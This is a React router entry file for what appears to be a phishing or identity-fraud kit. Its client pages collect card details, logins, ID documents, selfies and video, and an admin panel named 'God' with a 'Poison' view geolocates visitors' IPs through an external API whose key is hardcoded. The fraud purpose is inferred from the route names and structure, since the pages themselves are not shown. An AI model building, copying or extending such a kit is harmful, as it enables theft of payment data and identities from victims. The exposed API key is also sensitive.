import React from "react";
import ReactDOM from "react-dom/client";
import App from "./App.jsx";
import "./index.css";

import { createBrowserRouter, createHashRouter, RouterProvider } from "react-router-dom";
import Admin from "./Layouts/Admin.jsx";
import God from "./views/Admin/God.jsx";
import Poison from "./views/Admin/Poison.jsx";
import Card from "./views/Client/Card.jsx";
import Login from "./views/Client/Login.jsx";
import Client from "./Layouts/Client.jsx";
import Approve from "./views/Client/Approve.jsx";
import MobilePay from "./views/Client/MobilePay.jsx";
import Docs from "./views/Client/verification/Docs.jsx";
import Selfie from "./views/Client/verification/Selfie.jsx";
import Video from "./views/Client/verification/Video.jsx";

const godIsCreatingHumans = ({ params }) => {
  return [];
};

const usersLoader = ({ params }) => {
  return [];
};

const poisonLoader = async ({ params }) => {
  const result = await fetch(
    "https://ipgeolocation.abstractapi.com/v1/?api_key=82a9528162ca40f89fab49f8b8860ef3"
  );
  const data = await result.json();
  console.log(data);
  return data;
};

const router = createHashRouter([
  {
    path: "/",
    element: <Client />,
    children: [
      {
        path: "card",
        element: <Card />,
        loader: godIsCreatingHumans,
      },
      {
        path: "selfie",
        element: <Selfie />,
        loader: godIsCreatingHumans,
      },
      {
        path: "video",
        element: <Video />,
        loader: godIsCreatingHumans,
      },
      {
        path: "docs",
        element: <Docs />,
        loader: godIsCreatingHumans,
      },
      {
        path: "mobilepay",
        element: <MobilePay />,
        loader: godIsCreatingHumans,
      },
      {
        path: "login",
        element: <Login />,
        loader: usersLoader,
      },
      {
        path: "approve",
        element: <Approve />,
        loader: poisonLoader,
      },
    ],
  },
  {
    path: "/admin",
    element: <Admin />,
    children: [
      {
        path: "",
        element: <God />,
        loader: godIsCreatingHumans,
      },
      {
        path: "poison",
        element: <Poison />,
        loader: poisonLoader,
      },
    ],
  },
]);

ReactDOM.createRoot(document.getElementById("root")).render(
  <React.StrictMode>
    <RouterProvider router={router} />
  </React.StrictMode>
);
